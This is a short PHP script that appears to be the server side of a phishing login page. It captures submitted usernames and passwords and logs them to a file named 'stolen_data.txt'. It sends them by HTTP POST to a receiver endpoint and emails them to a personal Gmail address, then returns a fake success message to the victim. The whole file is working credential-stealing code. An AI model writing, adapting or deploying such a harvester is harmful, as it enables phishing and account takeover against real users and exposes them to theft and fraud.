<?php
header("Access-Control-Allow-Origin: *"); // Allow CORS for AJAX
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = filter_input(INPUT_POST, "username", FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, "password", FILTER_SANITIZE_STRING);
    
    // Log data to file
    $data = "Username: $username, Password: $password, IP: " . $_SERVER["REMOTE_ADDR"] . ", Time: " . date("Y-m-d H:i:s") . "\n";
    file_put_contents("data/stolen_data.txt", $data, FILE_APPEND);
    
    // Placeholder for remote exfiltration (not functional locally without setup)
    
    $ch = curl_init("http://localhost:8081/receiver.php");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["username" => $username, "password" => $password]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    $to = "bettarap254@gmail.com";
    $subject = "New Login Data";
    $message = "Username: $username\nPassword: $password\nIP: " . $_SERVER["REMOTE_ADDR"];
    mail($to, $subject, $message);
    
    
    // Return success response for AJAX
    echo json_encode(["status" => "success"]);
}
?>
